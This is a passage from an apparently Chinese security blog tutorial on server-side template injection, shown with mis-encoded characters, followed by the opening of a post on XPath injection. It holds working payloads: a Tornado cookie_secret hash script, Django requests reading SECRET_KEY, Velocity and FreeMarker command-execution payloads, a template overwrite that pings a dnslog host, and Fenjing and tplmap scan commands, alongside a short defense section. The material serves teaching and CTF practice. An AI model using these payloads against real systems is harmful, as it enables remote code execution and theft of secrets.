{{escape(handler.settings[\"cookie\"])}}ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯handler.settingså¯¹è±¡ï¼Œé‡Œé¢å­˜å‚¨ç€ä¸€äº›ç¯å¢ƒå˜é‡ã€‚ å…·ä½“åˆ†æè¯·å‚ç…§ã€Špython SSTI tornado renderæ¨¡æ¿æ³¨å…¥ã€‹ã€‚ è§‚å¯Ÿé”™è¯¯é¡µé¢ï¼Œå‘ç°é¡µé¢è¿”å›çš„ç”±msgçš„å€¼å†³å®š ä¿®æ”¹msgçš„å€¼æ³¨å…¥ï¼Œè·å¾—ç¯å¢ƒå˜é‡ cookie_secret: faaff564-f1dd-429d-90b3-130ab49962ea å¾—åˆ°cookie_secretçš„å€¼ï¼Œæ ¹æ®ä¸Šé¢çš„md5è¿›è¡Œç®—æ³•é‡æ„ï¼Œå°±å¯ä»¥å¾—åˆ°filehashï¼Œè¿™é‡Œç»™å‡ºpy3çš„è½¬æ¢è„šæœ¬ import hashlib hash = hashlib.md5() filename='/fllllllllllllag' cookie_secret=\"faaff564-f1dd-429d-90b3-130ab49962ea\" hash.update(filename.encode('utf-8')) s1=hash.hexdigest() hash = hashlib.md5() hash.update((cookie_secret+s1).encode('utf-8')) print(hash.hexdigest()) å¾—åˆ°filehash=874955327dac355296226eb28f1b02b8ï¼Œå¾—åˆ°flag ä¹ã€Python-Djangoæ¨¡æ¿ å…ˆçœ‹å­˜åœ¨æ¼æ´çš„ä»£ç ï¼š def view(request, *args, **kwargs): template = 'Hello {user}, This is your email: ' + request.GET.get('email') return HttpResponse(template.format(user=request.user)) å¾ˆæ˜æ˜¾ email å°±æ˜¯æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯æ¡ä»¶è¢«é™åˆ¶çš„å¾ˆæ­»ï¼Œå¾ˆéš¾æ‰§è¡Œå‘½ä»¤ï¼Œç°åœ¨æ‹¿åˆ°çš„åªæœ‰æœ‰ä¸€ä¸ªå’Œuseræœ‰å…³çš„å˜é‡request.user ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±åº”è¯¥åœ¨æ²¡æœ‰åº”ç”¨æºç çš„æƒ…å†µä¸‹å»å¯»æ‰¾æ¡†æ¶æœ¬èº«çš„å±æ€§ï¼Œçœ‹è¿™ä¸ªç©ºæ¡†æ¶æœ‰ä»€ä¹ˆå±æ€§å’Œç±»ä¹‹é—´çš„å¼•ç”¨ã€‚ åæ¥å‘ç°Djangoè‡ªå¸¦çš„åº”ç”¨ â€œadminâ€ï¼ˆä¹Ÿå°±æ˜¯Djangoè‡ªå¸¦çš„åå°ï¼‰çš„models.pyä¸­å¯¼å…¥äº†å½“å‰ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼š æ‰€ä»¥å¯ä»¥é€šè¿‡æŸç§æ–¹å¼ï¼Œæ‰¾åˆ°Djangoé»˜è®¤åº”ç”¨adminçš„modelï¼Œå†é€šè¿‡è¿™ä¸ªmodelè·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€WebåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯ã€‚ payloadå¦‚ä¸‹ï¼š http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY} http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY} åã€Java-velocityæ¨¡æ¿ ï¼ˆä»¥ä¸‹æ¿å—å‚ç…§è‡ªã€ŠCVE-2019-3396 Confluence Velocity SSTIæ¼æ´æµ…æã€‹ï¼‰ Apache Velocityæ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªæ¨¡æ¿è¯­è¨€å»å¼•ç”¨ç”±Javaä»£ç å®šä¹‰çš„å¯¹è±¡ã€‚Velocityæ˜¯ApacheåŸºé‡‘ä¼šæ——ä¸‹çš„ä¸€ä¸ªå¼€æºè½¯ä»¶é¡¹ç›®ï¼Œæ—¨åœ¨ç¡®ä¿Webåº”ç”¨ç¨‹åºåœ¨è¡¨ç¤ºå±‚å’Œä¸šåŠ¡é€»è¾‘å±‚ä¹‹é—´çš„éš”ç¦»ï¼ˆå³MVCè®¾è®¡æ¨¡å¼ï¼‰ã€‚ 1. åŸºæœ¬è¯­æ³• è¯­å¥æ ‡è¯†ç¬¦ #ç”¨æ¥æ ‡è¯†Velocityçš„è„šæœ¬è¯­å¥ï¼ŒåŒ…æ‹¬#setã€#if ã€#elseã€#endã€#foreachã€#endã€#includeã€#parseã€#macroç­‰è¯­å¥ã€‚ å˜é‡ $ç”¨æ¥æ ‡è¯†ä¸€ä¸ªå˜é‡ï¼Œæ¯”å¦‚æ¨¡æ¿æ–‡ä»¶ä¸­ä¸ºHello $aï¼Œå¯ä»¥è·å–é€šè¿‡ä¸Šä¸‹æ–‡ä¼ é€’çš„$a å£°æ˜ setç”¨äºå£°æ˜Velocityè„šæœ¬å˜é‡ï¼Œå˜é‡å¯ä»¥åœ¨è„šæœ¬ä¸­å£°æ˜ #set($a =\"velocity\") #set($b=1) #set($arrayName=[\"1\",\"2\"]) æ³¨é‡Š å•è¡Œæ³¨é‡Šä¸º##ï¼Œå¤šè¡Œæ³¨é‡Šä¸ºæˆå¯¹å‡ºç°çš„#* â€¦ *# æ¡ä»¶è¯­å¥ ä»¥if/elseä¸ºä¾‹ï¼š #if($foo&lt;10) &lt;strong&gt;1&lt;/strong&gt; #elseif($foo==10) &lt;strong&gt;2&lt;/strong&gt; #elseif($bar==6) &lt;strong&gt;3&lt;/strong&gt; #else &lt;strong&gt;4&lt;/strong&gt; #end è½¬ä¹‰å­—ç¬¦ å¦‚æœ$aå·²ç»è¢«å®šä¹‰ï¼Œä½†æ˜¯åˆéœ€è¦åŸæ ·è¾“å‡º$aï¼Œå¯ä»¥è¯•ç”¨\\è½¬ä¹‰ä½œä¸ºå…³é”®çš„$ åŸºç¡€ä½¿ç”¨ ä½¿ç”¨Velocityä¸»è¦æµç¨‹ä¸ºï¼š åˆå§‹åŒ–Velocityæ¨¡æ¿å¼•æ“ï¼ŒåŒ…æ‹¬æ¨¡æ¿è·¯å¾„ã€åŠ è½½ç±»å‹ç­‰ åˆ›å»ºç”¨äºå­˜å‚¨é¢„ä¼ é€’åˆ°æ¨¡æ¿æ–‡ä»¶çš„æ•°æ®çš„ä¸Šä¸‹æ–‡ é€‰æ‹©å…·ä½“çš„æ¨¡æ¿æ–‡ä»¶ï¼Œä¼ é€’æ•°æ®å®Œæˆæ¸²æŸ“ VelocityTest.java package Velocity; import org.apache.velocity.Template; import org.apache.velocity.VelocityContext; import org.apache.velocity.app.VelocityEngine; import java.io.StringWriter; public class VelocityTest { public static void main(String[] args) { VelocityEngine velocityEngine = new VelocityEngine(); velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, \"file\"); velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, \"src/main/resources\"); velocityEngine.init(); VelocityContext context = new VelocityContext(); context.put(\"name\", \"Rai4over\"); context.put(\"project\", \"Velocity\"); Template template = velocityEngine.getTemplate(\"test.vm\"); StringWriter sw = new StringWriter(); template.merge(context, sw); System.out.println(\"final output:\" + sw); } } æ¨¡æ¿æ–‡ä»¶ï¼šsrc/main/resources/test.vm Hello World! The first velocity demo. Name is $name. Project is $project è¾“å‡ºç»“æœï¼š final output: Hello World! The first velocity demo. Name is Victor Zhang. Project is Velocity java.lang.UNIXProcess@12f40c25 é€šè¿‡ VelocityEngine åˆ›å»ºæ¨¡æ¿å¼•æ“ï¼Œæ¥ç€ velocityEngine.setProperty è®¾ç½®æ¨¡æ¿è·¯å¾„ src/main/resourcesã€åŠ è½½å™¨ç±»å‹ä¸ºfileï¼Œæœ€åé€šè¿‡ velocityEngine.init() å®Œæˆå¼•æ“åˆå§‹åŒ–ã€‚ é€šè¿‡ VelocityContext() åˆ›å»ºä¸Šä¸‹æ–‡å˜é‡ï¼Œé€šè¿‡putæ·»åŠ æ¨¡æ¿ä¸­ä½¿ç”¨çš„å˜é‡åˆ°ä¸Šä¸‹æ–‡ã€‚ é€šè¿‡ getTemplate é€‰æ‹©è·¯å¾„ä¸­å…·ä½“çš„æ¨¡æ¿æ–‡ä»¶test.vmï¼Œåˆ›å»º StringWriter å¯¹è±¡å­˜å‚¨æ¸²æŸ“ç»“æœï¼Œç„¶åå°†ä¸Šä¸‹æ–‡å˜é‡ä¼ å…¥ template.merge è¿›è¡Œæ¸²æŸ“ã€‚ æ¯”å¦‚ï¼š è¿™é‡Œä½¿ç”¨java-sec-codeé‡Œé¢çš„SSTIä»£ç ï¼š pocï¼š http://127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"sleep 5\").waitFor() //å»¶è¿Ÿäº†5ç§’ å‚ç…§ã€Šç™½å¤´æ”æ›´çŸ­ï¼ŒSSTIæƒ¹äººå¿ƒï¼ã€‹ç®€å•è¿›è¡Œè°ƒè¯• åœ¨æœ€åˆçš„Controllerå±‚ä¸‹æ–­ç‚¹ï¼Œæ¥è¿½è¸ªpocçš„è§£æè¿‡ç¨‹ï¼š ï¼ˆtemplate -&gt; instringï¼‰è¿›å…¥ Velocity.evaluate æ–¹æ³•ï¼š ï¼ˆinstring -&gt; readerï¼‰ç»§ç»­è·Ÿè¿› evaluate æ–¹æ³•ï¼ŒRuntimeInstanceç±»ä¸­å°è£…äº†evaluateæ–¹æ³•ï¼Œinstringè¢«å¼ºåˆ¶è½¬åŒ–(Reader)ç±»å‹ã€‚ è·Ÿè¿› StringReader æ–¹æ³•æŸ¥çœ‹è¯¦æƒ…ï¼š ï¼ˆreader -&gt; nodeTreeï¼‰ç»§ç»­è·Ÿè¿› this.evaluate() æ–¹æ³• ï¼ˆnodeTree -&gt; writerï¼‰ç»§ç»­è·Ÿè¿›renderæ–¹æ³• emmmâ€¦ç»§ç»­è·Ÿè¿›render ç»§ç»­çœ‹renderæ–¹æ³• è·Ÿè¿›executeæ–¹æ³• å¯ä»¥çœ‹åˆ°è¿™æ˜¯æœ€åä¸€æ­¥äº†ï¼Œè°ƒè¯•ç»“æŸå°±å¯ä»¥çœ‹åˆ°pocå·²ç»æˆåŠŸè¢«æ‰§è¡Œï¼Œçœ‹ä¸€ä¸‹ä¸Šå›¾ä¸­çš„forå¾ªç¯çš„ä»£ç ï¼Œå¤§æ¦‚æ„æ€æ˜¯å½“éå†çš„èŠ‚ç‚¹æ—¶å€™ï¼Œè¿™æ—¶å€™å°±ä¼šä¸€æ­¥æ­¥çš„ä¿å­˜æˆ‘ä»¬çš„payloadæœ€ç»ˆå¯¼è‡´RCE Confluence æœªæˆæƒRCEåˆ†æï¼ˆCVE-2019-3396ï¼‰ æ ¹æ®å®˜æ–¹æ–‡æ¡£çš„æè¿°ï¼Œå¯ä»¥çœ‹åˆ°è¿™æ˜¯ç”± widget Connector è¿™ä¸ªæ’ä»¶é€ æˆçš„SSTIï¼Œåˆ©ç”¨SSTIè€Œé€ æˆçš„RCEã€‚åœ¨ç»è¿‡diffåï¼Œå¯ä»¥ç¡®å®šè§¦å‘æ¼æ´çš„å…³é”®ç‚¹åœ¨äºå¯¹poståŒ…ä¸­çš„_templateå­—æ®µ å…·ä½“æ¼æ´ä»£ç è°ƒè¯•å¯ä»¥å‚è€ƒï¼šã€ŠConfluenceæœªæˆæƒæ¨¡æ¿æ³¨å…¥/ä»£ç æ‰§è¡Œ(CVE-2019-3396)ã€‹ ã€Š[Confluence æœªæˆæƒRCEåˆ†æï¼ˆCVE-2019-3396ï¼‰](https://lucifaer.com/2019/04/16/Confluence æœªæˆæƒRCEåˆ†æï¼ˆCVE-2019-3396ï¼‰/#0x01-æ¼æ´æ¦‚è¿°)ã€‹ åä¸€ã€Java-FreeMarker FreeMarker æ˜¯ä¸€æ¬¾æ¨¡æ¿å¼•æ“ï¼šå³ä¸€ç§åŸºäºæ¨¡æ¿å’Œè¦æ”¹å˜çš„æ•°æ®ï¼Œ å¹¶ç”¨æ¥ç”Ÿæˆè¾“å‡ºæ–‡æœ¬(HTMLç½‘é¡µï¼Œç”µå­é‚®ä»¶ï¼Œé…ç½®æ–‡ä»¶ï¼Œæºä»£ç ç­‰)çš„é€šç”¨å·¥å…·ã€‚ å®ƒä¸æ˜¯é¢å‘æœ€ç»ˆç”¨æˆ·çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªJavaç±»åº“ï¼Œæ˜¯ä¸€æ¬¾ç¨‹åºå‘˜å¯ä»¥åµŒå…¥ä»–ä»¬æ‰€å¼€å‘äº§å“çš„ç»„ä»¶ã€‚ FreeMarkeræ¨¡æ¿ä»£ç ï¼š &lt;html&gt; &lt;head&gt; &lt;title&gt;Welcome!&lt;/title&gt; &lt;/head&gt; &lt;body&gt;ã€€&lt;#â€“è¿™æ˜¯æ³¨é‡Šâ€“&gt; &lt;h1&gt;Welcome ${user}!&lt;/h1&gt; &lt;p&gt;Our latest product: &lt;a href=\"${latestProduct.url}\"&gt;${latestProduct.name}&lt;/a&gt;! &lt;/body&gt; &lt;/html&gt; æ¨¡æ¿æ–‡ä»¶å­˜æ”¾åœ¨WebæœåŠ¡å™¨ä¸Šï¼Œå°±åƒé€šå¸¸å­˜æ”¾é™æ€HTMLé¡µé¢é‚£æ ·ã€‚å½“æœ‰äººæ¥è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œ FreeMarkerå°†ä¼šä»‹å…¥æ‰§è¡Œï¼Œç„¶ååŠ¨æ€è½¬æ¢æ¨¡æ¿ï¼Œç”¨æœ€æ–°çš„æ•°æ®å†…å®¹æ›¿æ¢æ¨¡æ¿ä¸­ ${â€¦} çš„éƒ¨åˆ†ï¼Œ ä¹‹åå°†ç»“æœå‘é€åˆ°è®¿é—®è€…çš„Webæµè§ˆå™¨ä¸­ã€‚ è¿™ä¸ªæ¨¡æ¿ä¸»è¦ç”¨äº java ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å®ç° TemplateModel æ¥ç”¨ new åˆ›å»ºä»»æ„ Java å¯¹è±¡ å…·ä½“çš„é«˜çº§å†…ç½®å‡½æ•°å®šä¹‰å‚è€ƒã€ŠSeldom used and expert built-insã€‹ ä¸»è¦çš„ç”¨æ³•å¦‚ä¸‹ï¼š &lt;ï¼ƒ - åˆ›å»ºä¸€ä¸ªç”¨æˆ·å®šä¹‰çš„æŒ‡ä»¤ï¼Œè°ƒç”¨ç±»çš„å‚æ•°æ„é€ å‡½æ•° - &gt; &lt;#assign word_wrapp =\"com.acmee.freemarker.WordWrapperDirective\"?newï¼ˆï¼‰&gt; &lt;ï¼ƒ - åˆ›å»ºä¸€ä¸ªç”¨æˆ·å®šä¹‰çš„æŒ‡ä»¤ï¼Œç”¨ä¸€ä¸ªæ•°å­—å‚æ•°è°ƒç”¨æ„é€ å‡½æ•° - &gt; &lt;#assign word_wrapp_narrow =\"com.acmee.freemarker.WordWrapperDirective\"?newï¼ˆ40ï¼‰&gt; è°ƒç”¨äº†æ„é€ å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸ª payload ä¸­å°±æ˜¯è°ƒç”¨çš„ freemarker çš„å†…ç½®æ‰§è¡Œå‘½ä»¤çš„å¯¹è±¡ Execute freemarker.template.utility é‡Œé¢æœ‰ä¸ªExecuteç±»ï¼Œè¿™ä¸ªç±»ä¼šæ‰§è¡Œå®ƒçš„å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨newå‡½æ•°æ–°å»ºä¸€ä¸ªExecuteç±»ï¼Œä¼ è¾“æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ä½œä¸ºå‚æ•°ï¼Œä»è€Œæ„é€ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ„é€ payloadï¼š &lt;#assign value=\"freemarker.template.utility.Execute\"?new()&gt;${value(\"calc.exe\")} freemarker.template.utility é‡Œé¢çš„JythonRuntimeï¼Œå¯ä»¥é€šè¿‡è‡ªå®šä¹‰æ ‡ç­¾çš„æ–¹å¼ï¼Œæ‰§è¡ŒPythonå‘½ä»¤ï¼Œä»è€Œæ„é€ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ &lt;#assign value=\"freemarker.template.utility.JythonRuntime\"?new()&gt;&lt;@value&gt;import os;os.system(\"calc.exe\")&lt;/@value&gt; è¿™é‡Œä½¿ç”¨æµ‹è¯•ä»£ç æ¥å¤§æ¦‚æ¼”ç¤ºä¸€ä¸‹ï¼šhttps://github.com/hellokoding/springboot-freemarker ä»£ç æ¼”ç¤ºè¯´æ˜ï¼šhttps://hellokoding.com/spring-boot/freemarker/ å‰ç«¯ä»£ç  â€”â€”&gt; hello.ftl &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Hello ${name}!&lt;/title&gt; &lt;link href=\"/css/main.css\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body&gt; &lt;h2 class=\"hello-title\"&gt;Hello ${name}!&lt;/h2&gt; &lt;script src=\"/js/main.js\"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; åç«¯ä»£ç  â€”â€”&gt; HelloController.javaï¼š package com.backendvulnerabilities.ssti; import freemarker.cache.MultiTemplateLoader; import freemarker.cache.StringTemplateLoader; import freemarker.cache.TemplateLoader; import freemarker.template.Configuration; import freemarker.template.Template; import freemarker.template.TemplateException; import freemarker.template.utility.DateUtil; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.StringWriter; import java.util.HashMap; import java.util.Map; @Controller public class HelloController { @Autowired private Configuration con; @GetMapping(\"/\") public String index() { return \"index\"; } @RequestMapping(value = \"/hello\") public String hello(@RequestBody Map&lt;String,Object&gt; body, Model model) { model.addAttribute(\"name\", body.get(\"name\")); return \"hello\"; } @RequestMapping(value = \"/freemarker\") public void freemarker(@RequestParam(\"username\") String username, HttpServletRequest httpserver,HttpServletResponse response) { try{ String data = \"1ooooooooooooooooooo~\"; String templateContent = \"&lt;html&gt;&lt;body&gt;Hello \" + username + \" ${data}&lt;/body&gt;&lt;/html&gt;\"; String html = createHtmlFromString(templateContent,data); response.getWriter().println(html); }catch (Exception e){ e.printStackTrace(); } } private String createHtmlFromString(String templateContent, String data) throws IOException, TemplateException { Configuration cfg = new Configuration(); StringTemplateLoader stringLoader = new StringTemplateLoader(); stringLoader.putTemplate(\"myTemplate\",templateContent); cfg.setTemplateLoader(stringLoader); Template template = cfg.getTemplate(\"myTemplate\",\"utf-8\"); Map root = new HashMap(); root.put(\"data\",data); StringWriter writer = new StringWriter(); template.process(root,writer); return writer.toString(); } @RequestMapping(value = \"/template\", method = RequestMethod.POST) public String template(@RequestBody Map&lt;String,String&gt; templates) throws IOException { StringTemplateLoader stringLoader = new StringTemplateLoader(); for(String templateKey : templates.keySet()){ stringLoader.putTemplate(templateKey, templates.get(templateKey)); } con.setTemplateLoader(new MultiTemplateLoader(new TemplateLoader[]{stringLoader, con.getTemplateLoader()})); return \"index\"; } } ä¸Šè¿°ä»£ç ä¸»è¦ç¼–è¯‘ç»™å®šçš„æ¨¡æ¿å­—ç¬¦ä¸²å’Œæ•°æ®ï¼Œç”ŸæˆHTMLè¿›è¡Œè¾“å‡º æ¨¡æ¿æ³¨å…¥çš„å‰ææ˜¯åœ¨æ— è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨æ¨¡æ¿æ¥è§£ææˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ï¼Œå¯ä»¥é€šè¿‡é¡µé¢ä¸Šçš„å˜åŒ–ï¼Œæ¥åˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„å†…å®¹æ˜¯å¦è¢«è§£æï¼Œå¦‚ä¸Šå›¾æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¢«æˆåŠŸè§£æåˆ°é¡µé¢ä¸Šï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æ»¤ã€‚ é¦–å…ˆéœ€è¦æ§åˆ¶è¢«æ”»å‡»æ¨¡æ¿ /template çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¦å°†æœ¬æ¥æ— å±å®³çš„æ¨¡æ¿æ–‡ä»¶å®æ—¶æ›´æ”¹ä¸ºå¯æ”»å‡»çš„æ¨¡æ¿å†…å®¹ã€‚ä½¿ç”¨çš„payload {\"hello.ftl\": \"&lt;!DOCTYPE html&gt;&lt;html lang=\\\"en\\\"&gt;&lt;head&gt;&lt;meta charset=\\\"UTF-8\\\"&gt;&lt;#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()&gt; ${ ex(\\\"ping ilxwh0.dnslog.cn\\\") }&lt;title&gt;Hello!&lt;/title&gt;&lt;link href=\\\"/css/main.css\\\" rel=\\\"stylesheet\\\"&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 class=\\\"hello-title\\\"&gt;Hello!&lt;/h2&gt;&lt;script src=\\\"/js/main.js\\\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\"} å…³é”®ä»£ç åœ¨ä¸Šå›¾çš„çº¢æ¡†ä¸­ï¼Œæ¥æ”¶ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ï¼Œä½¿ç”¨keySet()è·å–keyå€¼ï¼Œéå†ç›¸åº”çš„æ¨¡å—åå­—ï¼Œä½¿ç”¨StringTemplateLoaderæ¥åŠ è½½æ¨¡æ¿å†…å®¹ï¼Œå¹¶ä½¿ç”¨putTemplateå°†keyå¯¹åº”çš„valueï¼ˆä¹Ÿå°±æ˜¯payloadï¼‰å†™å…¥templateKeyä¸­ã€‚è¿™æ ·å°±å¯ä»¥è¦†ç›– hello.ftl æ–‡ä»¶çš„å†…å®¹ï¼Œå…·ä½“å¦‚ä¸‹ï¼š é‡æ–°æ›´æ”¹äº†åŠ è½½çš„æ¨¡æ¿å†…å®¹åï¼Œç„¶åç›´æ¥è®¿é—®å—å½±å“çš„æ¨¡æ¿æ–‡ä»¶è·¯å¾„ï¼Œæ­¤æ—¶æ¶æ„çš„æ¨¡æ¿æ–‡ä»¶å†…å®¹å°±ä¼šè¢«åŠ è½½æˆåŠŸäº†ï¼Œå¹¶æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤ dnslogå¹³å°ä¹Ÿå—åˆ°äº†è¯·æ±‚ åè¨€ ç”±äºæœ¬ç¯‡æ–‡ç« ç¯‡å¹…è¿‡é•¿ï¼Œå®¹æ˜“è„‘å£³ç–¼ï¼Œæ‰€ä»¥åˆ†ä¸ºä¸Šä¸‹ç¯‡ï¼Œä¸Šç¯‡å¤§æ¦‚ä»‹ç»äº†å‡ ç§è¯­è¨€å¸¸è§çš„å‡ ç§æ¨¡æ¿æ³¨å…¥ï¼Œä¸‹ç¯‡åˆ†æå‡ ä¸ªcmsçš„æ¨¡æ¿æ³¨å…¥ï¼ŒåŒ…æ‹¬æµ·æ´‹cmsï¼Œ74cmsï¼Œofcmsç­‰ å‚è€ƒï¼šhttps://www.cnblogs.com/bmjoker/p/13508538.html åäºŒã€è‡ªåŠ¨åŒ–å·¥å…· 1.æ‰‹åŠ¨å®‰è£…ï¼Œå…·ä½“å‚è€ƒï¼š https://github.com/Marven11/Fenjing git clone https://github.com/Marven11/Fenjing cd Fenjing python -m pip install -r requirements.txt python -m fenjing scan --url 'http://xxx/' è¾“å…¥ä»¥ä¸Šå‘½ä»¤éšåï¼Œcat /flagå³å¯å¾—åˆ°flag å‚è€ƒï¼šhttps://xz.aliyun.com/t/11108 --smartyæ¨¡æ¿ 2.è¿™é‡Œæ¨èè‡ªåŠ¨åŒ–å·¥å…·tplmapï¼Œæ‹¿shellã€æ‰§è¡Œå‘½ä»¤ã€bind_shellã€åå¼¹shellã€ä¸Šä¼ ä¸‹è½½æ–‡ä»¶ï¼ŒTplmapä¸ºSSTIçš„åˆ©ç”¨æä¾›äº†å¾ˆå¤§çš„ä¾¿åˆ© githubåœ°å€ï¼šhttps://github.com/epinna/tplmap ä¸€é”®shellçœŸé¦™ï¼Œè¿˜æ”¯æŒå…¶ä»–æ¨¡æ¿ï¼ˆSmartyï¼ŒMakoï¼ŒTornadoï¼ŒJinja2ï¼‰çš„æ³¨å…¥æ£€æµ‹ åä¸‰ã€æ¼æ´é˜²å¾¡ å’Œå…¶ä»–çš„æ³¨å…¥é˜²å¾¡ä¸€æ ·ï¼Œç»å¯¹ä¸è¦è®©ç”¨æˆ·å¯¹ä¼ å…¥æ¨¡æ¿çš„å†…å®¹æˆ–è€…æ¨¡æ¿æœ¬èº«è¿›è¡Œæ§åˆ¶ å‡å°‘æˆ–è€…æ”¾å¼ƒç›´æ¥ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“åˆå­—ç¬¦ä¸²æ‹¼æ¥çš„æ¨¡æ¿æ¸²æŸ“æ–¹å¼ï¼Œä½¿ç”¨æ­£è§„çš„æ¨¡æ¿æ¸²æŸ“æ–¹æ³• å°½å¯èƒ½åŠ è½½é™æ€æ¨¡æ¿æ–‡ä»¶ å¦ä¸€ä¸ªé€‰æ‹©æ˜¯åˆ›å»ºä¸€ä¸ªå®‰å…¨åŠ å›º/æ²™ç®±ç¯å¢ƒï¼Œç¦ç”¨æˆ–åˆ é™¤æ½œåœ¨çš„å±é™©æŒ‡ä»¤ã€‚","categories":["å¸¸è§topæ¼æ´"]},{"title":"æµ…æXpathæ³¨å…¥","path":"/2023/08/06/qian-xi-xpath-zhu-ru/","content":"Xpathæ³¨å…¥æ€»ç»“ 0x01 ä»€ä¹ˆæ˜¯Xpath XPath å³ä¸º XML è·¯å¾„è¯­è¨€ï¼Œæ˜¯ W3C XSLT æ ‡å‡†çš„ä¸»è¦å…ƒç´ ï¼Œå®ƒæ˜¯ä¸€ç§ç”¨æ¥ç¡®å®š XMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„å­é›†ï¼‰æ–‡æ¡£ä¸­æŸéƒ¨åˆ†ä½ç½®çš„è¯­è¨€ã€‚å®ƒæ˜¯ä¸€ç§ç”¨æ¥åœ¨å†…å­˜ä¸­å¯¼èˆªæ•´ä¸ªXMLæ ‘çš„è¯­è¨€,å®ƒçš„è®¾è®¡åˆè¡·æ˜¯ä½œä¸ºä¸€ç§é¢å‘XSLTå’ŒXPointerçš„è¯­è¨€,åæ¥ç‹¬ç«‹æˆäº†ä¸€ç§W3Cæ ‡å‡†ã€‚ XPath åŸºäº XML çš„æ ‘çŠ¶ç»“æ„ï¼Œæœ‰ä¸åŒç±»å‹çš„èŠ‚ç‚¹ï¼ŒåŒ…æ‹¬å…ƒç´ èŠ‚ç‚¹ï¼Œå±æ€§èŠ‚ç‚¹å’Œæ–‡æœ¬èŠ‚ç‚¹ï¼Œæä¾›åœ¨æ•°æ®ç»“æ„æ ‘ä¸­æ‰¾å¯»èŠ‚ç‚¹çš„èƒ½åŠ›ï¼Œå¯ç”¨æ¥åœ¨ XML æ–‡æ¡£ä¸­å¯¹å…ƒç´ å’Œå±æ€§è¿›è¡Œéå†ã€‚ XPath ä½¿ç”¨è·¯å¾„è¡¨è¾¾å¼æ¥é€‰å– XML æ–‡æ¡£ä¸­çš„èŠ‚ç‚¹æˆ–è€…èŠ‚ç‚¹é›†ã€‚è¿™äº›è·¯å¾„è¡¨è¾¾å¼å’Œæˆ‘ä»¬åœ¨å¸¸è§„çš„ç”µè„‘æ–‡ä»¶ç³»ç»Ÿä¸­çœ‹åˆ°çš„è¡¨è¾¾å¼éå¸¸ç›¸ä¼¼ã€‚ **ä¸€å¥è¯æ€»ç»“ï¼š**XPathçš„ä½œç”¨å°±æ˜¯ç”¨äºåœ¨XMLæˆ–HTMLä¸­æŸ¥æ‰¾ä¿¡æ¯ï¼Œå°±åƒSQLè¯­å¥çš„ä½œç”¨æ˜¯åœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢ä¿¡æ¯ä¸€æ ·ã€‚ 0x02 Xpathçš„ç®€å•æ¼”ç¤º Xpathè¯­æ³•çš„ç®€å•å±•ç¤º: åœ¨XPathä¸­,XMLæ–‡æ¡£è¢«ä½œä¸ºèŠ‚ç‚¹æ ‘å¯¹å¾…,XPathä¸­æœ‰ä¸ƒç§ç»“ç‚¹ç±»å‹ï¼šå…ƒç´ ã€å±æ€§ã€æ–‡æœ¬ã€å‘½åç©ºé—´ã€å¤„ç†æŒ‡ä»¤ã€æ³¨é‡Šä»¥åŠæ–‡æ¡£èŠ‚ç‚¹ï¼ˆæˆ–æˆä¸ºæ ¹èŠ‚ç‚¹ï¼‰ã€‚ nodenameï¼šé€‰å–æ­¤èŠ‚ç‚¹çš„æ‰€æœ‰èŠ‚ç‚¹ /ï¼š ä»æ ¹èŠ‚ç‚¹é€‰å– //ï¼šè¡¨ç¤ºé€‰å–æ‰€æœ‰çš„å­å…ƒç´ ï¼Œä¸è€ƒè™‘å…¶åœ¨æ–‡æ¡£çš„ä½ç½® .ï¼š é€‰å–å½“å‰èŠ‚ç‚¹ ..ï¼šé€‰å–å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ @ï¼šé€‰å–å±æ€§ æˆ–@*: 